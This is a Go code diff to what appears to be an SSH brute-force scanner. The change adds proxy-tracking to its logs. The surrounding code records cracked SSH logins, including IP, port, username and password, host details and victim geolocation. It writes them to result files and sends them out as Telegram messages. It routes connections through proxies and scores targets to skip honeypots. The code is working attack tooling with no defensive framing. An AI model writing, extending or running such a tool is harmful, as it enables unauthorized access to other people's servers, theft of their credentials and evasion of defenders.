@@ -961,7 +961,7 @@ func processSSHTask(t SSHTask) {
 
 	start := time.Now()
 	target := t.IP + ":" + t.Port
-	conn, err, _ := dialWithProxy(target, timeout)
+	conn, err, proxyUsed := dialWithProxy(target, timeout)
 	if err != nil {
 		atomic.AddInt64(&stats.errors, 1)
 		return
@@ -1077,13 +1077,14 @@ Region: %s
 City: %s
 Org: %s
 Honeypot Score: %d
+Proxy: %s
 Timestamp: %s
 ===========
 
 `, info.IP, info.Port, info.Username, info.Password, info.Hostname, info.OSInfo, info.SSHVersion,
 			info.ResponseTime, strings.Join(info.OpenPorts, ", "), info.CPUCores, info.Architecture, info.CPUModel,
 			gpuStr, diskStr,
-			ipinfo.Country, ipinfo.Region, ipinfo.City, ipinfo.Org, info.HoneypotScore, time.Now().Format("2006-01-02 15:04:05"))
+			ipinfo.Country, ipinfo.Region, ipinfo.City, ipinfo.Org, info.HoneypotScore, proxyUsed, time.Now().Format("2006-01-02 15:04:05"))
 		appendToFile(detailed, "detailed-results.txt")
 		
 		telegramMsg := fmt.Sprintf(`✅ <b>SSH SUCCESS</b>
@@ -1093,24 +1094,36 @@ Timestamp: %s
 💻 OS: %s
 📍 %s, %s, %s
 🏢 %s
-⏱️ Response: %v`,
+⏱️ Response: %v
+🔗 Proxy: %s`,
 			info.IP, info.Port, info.Username, info.Password,
 			info.Hostname, info.OSInfo,
 			ipinfo.City, ipinfo.Region, ipinfo.Country,
-			ipinfo.Org, info.ResponseTime)
+			ipinfo.Org, info.ResponseTime, proxyUsed)
 		
 		go sendTelegramMessage(telegramMsg)
 		
 		fmt.Printf("SUCCESS: %s\n", line[:len(line)-1])
 	} else {
 		atomic.AddInt64(&stats.honeypots, 1)
-		log.Printf("Honeypot: %s:%s (Score: %d)", info.IP, info.Port, info.HoneypotScore)
+		
+		// Log with proxy information
+		honeypotLog := fmt.Sprintf("%s | Proxy: %s | Honeypot: %s:%s (Score: %d) CPU: %d\n",
+			time.Now().Format("2006-01-02 15:04:05"),
+			proxyUsed,
+			info.IP, info.Port, info.HoneypotScore, info.CPUCores)
+		
+		log.Printf("Proxy: %s | Honeypot: %s:%s (Score: %d)", proxyUsed, info.IP, info.Port, info.HoneypotScore)
 
 		if info.HoneypotScore >= 10 {
-			appendToFile(fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d\n",
-				info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
+			appendToFile(fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d Proxy: %s\n",
+				info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores, proxyUsed), "honeypots.txt")
 		} else {
-			appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d) CPU: %d\n", info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
+			appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d) CPU: %d Proxy: %s\n",
+				info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores, proxyUsed), "honeypots.txt")
 		}
+		
+		// Also log to a separate honeypot-proxy log for tracking
+		appendToFile(honeypotLog, "honeypot-proxy.log")
 	}
 }
